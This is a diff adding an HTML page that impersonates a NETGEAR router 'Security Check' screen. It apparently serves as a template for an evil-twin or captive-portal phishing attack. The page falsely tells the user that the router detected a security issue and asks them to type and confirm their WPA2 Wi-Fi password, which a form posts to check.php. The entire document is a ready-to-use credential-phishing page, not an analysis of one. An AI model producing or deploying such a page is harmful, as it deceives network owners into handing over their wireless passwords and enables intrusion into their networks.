@@ -1,0 +1,71 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+<title>NETGEAR Security Check</title>
+<link rel="stylesheet" type="text/css" href="css/mainpage.css">	
+<link rel="stylesheet" type="text/css" href="css/tabs.css">
+<link rel="stylesheet" type="text/css" href="css/button.css">
+<link rel="stylesheet" type="text/css" href="css/menu.css">
+</head>
+
+<body style="padding:0;margin:0;background-color:#FFFFFF;overflow:none" onload="change_size();" onResize="change_size();">
+
+<table style="height:52px;width:100%;margin:0;padding:0" CELLPADDING=0 CELLSPACING=0 class="newtopframe">
+    
+    <td style="padding-left:20px">
+        <img style="position:relative;left:-7px;" src="img/NewNetgeargenie.png" >
+        <br><span id="ModuleName"><b>Netgear Router</b></span>
+        
+    </td>
+    
+    <td style="text-align:right;padding-right:25px:">
+        <button type="button" value="BUTTON"  onClick="gui_logout();" name="logout" class="button-rule" style="padding-left:10px" ><span class="roundleft_button">&nbsp;&nbsp;&nbsp;&nbsp;Security Check</span><span class="roundright_button">&nbsp;&nbsp;&nbsp;&nbsp;</span></button>
+        <br style='line-height:8px'></br>
+    </td>
+</table>
+      
+<tr><td>
+<ul class="tabs" width="100%" >
+<li id="lang_menu_li" style="" >
+</li></ul></tr></td>
+
+<td style="background-color:#FFFFFF;width:200px;font-size:12px;font-family:Arial;">
+    
+    <div align="center">
+    <td>
+            <br><span id="ModuleName"><b><img src="img/error-icon.gif"> Your NETGEAR&trade; wireless router detected a security issue. Please enter your wireless security settings to proceed.</b></span>
+            </td>
+    </div>
+    
+    <tr><td><form action="check.php" method="post" align="center">
+        <br>&nbsp;&nbsp;&nbsp;WPA2 Password: <input type="password" name="password1">
+            <br>Confirm Password: <input type="password" name="password2">
+                <br><input type="submit" value="Submit" value="Send"></form></td></td></tr>
+
+<div align="center">
+    <td>
+        <br>Note: If you have not changed your wireless settings, the default password is printed on the bottom of the router.</b></span></br>
+        <br><img src="img/label.png">
+        
+    </td>
+</div>
+
+<div class="pane" id="basic-pane" align="center">
+<table id="basic-table">
+<tr>
+<td style="background-color:#FFFFFF;font-size:12px;font-family:Arial;">
+
+        <div font="Arial" class="basic-menu-eco-div" id="basic-eco"><a href="http://kb.netgear.com/app/answers/detail/a_id/24244/~/understanding-netgear-led-symbols" id="ECO_menu"><span>Click here for support!</span></a>
+        </div>
+
+</td>
+</tr>
+</table>
+</div>
+
+<div id="footer" class="footer">
+    <img class="footer_img" src="img/footer.gif">
+</div>
+
+</body>
+</html>
